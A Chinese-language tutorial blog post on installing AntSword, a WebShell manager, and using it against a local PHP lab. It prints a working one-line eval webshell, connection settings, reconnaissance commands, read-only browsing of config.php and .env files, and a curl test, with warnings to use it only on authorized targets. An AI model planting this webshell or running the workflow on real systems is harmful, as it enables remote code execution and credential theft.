---
title: "蚁剑的安装与使用"
slug: "antsword-usage"
date: 2026-08-28T20:40:57+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "把 AntSword 装进终端命令，记录 WebShell 管理器的基本用法。"
summary: "把 AntSword 装进终端命令，记录 WebShell 管理器的基本用法。"
tags: ["蚁剑", "WebShell", "工具"]
categories: ["安全工具"]
series: ["安全工具箱"]
weight: 1
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/4.蚁剑的使用.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/antsword-usage/workflow.svg" alt="从受控 PHP 文件到蚁剑连接，再到只读验证和证据记录。" loading="lazy">
  <figcaption>图 1 · 蚁剑最小验证链。从受控 PHP 文件到蚁剑连接，再到只读验证和证据记录。</figcaption>
</figure>

## 1. 安装与本地环境

蚁剑官方仓库：

```bash
git clone https://github.com/AntSwordProject/AntSword-Loader.git
cd AntSword-Loader
```

运行前准备：

- Node.js；
- 一个明确授权的靶场；
- PHP 测试文件或题目给出的上传入口。

如果使用现有 PBox 环境，可以直接启动：

```powershell
& 'D:\PBox-full\tools\gui_webshell\AntSword\AntSword-Loader-v4.0.3-win32-x64\AntSword.exe'
```

## 2. 本地 PHP 靶场

创建 `/tmp/antsword-lab/index.php`：

```php
<?php
$cmd = $_POST['cmd'] ?? '';
if (is_string($cmd)) {
    eval($cmd);
}
```

启动：

```bash
cd /tmp/antsword-lab
php -S 127.0.0.1:8080
```

这是一个明确受限的本地测试文件，不要上传到任何未授权系统。

## 3. 蚁剑连接配置

打开蚁剑，右键空白处选择“添加数据”，填写：

![蚁剑连接配置](/images/notes/antsword-usage/connect.png)

```text
URL: http://127.0.0.1:8080/index.php
密码: cmd
编码: UTF-8
类型: PHP
```

点击“测试连接”。成功后会进入文件和虚拟终端管理：

![蚁剑虚拟终端](/images/notes/antsword-usage/terminal.png)

## 4. 最小验证命令

在虚拟终端依次执行：

```bash
whoami
pwd
id
ls -la
```

Windows 目标：

```cmd
whoami
cd
dir
```

## 5. 文件管理

只做只读操作时：

1. 打开文件管理；
2. 进入目标目录；
3. 查看 `config.php`、`.env`、日志文件；
4. 记录文件路径、时间和内容摘要；
5. 不修改、不删除生产文件。

## 6. 常见问题

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 测试连接失败 | URL 或参数名不对 | 用 curl 先手工验证 |
| 返回 404 | 文件路径错 | 确认上传后的真实路径 |
| 返回源码 | PHP 未解析 | 检查服务器配置 |
| 命令乱码 | 编码不一致 | 切换 UTF-8/GBK |
| 上传后无权限 | 目录权限不足 | 记录错误，不盲目提权 |

## 7. 自动化命令速查

```bash
# 手工验证 PHP 会话
curl -sS -X POST \
  --data-urlencode 'cmd=echo "ANTSWORD_OK";' \
  'http://127.0.0.1:8080/index.php'
```

预期输出：

```text
ANTSWORD_OK
```

## 8. 安全边界

- 只在授权靶场中使用；
- 先做只读验证；
- 不上传后门到真实业务；
- 不保存真实凭据；
- 测试后清理临时文件和日志。
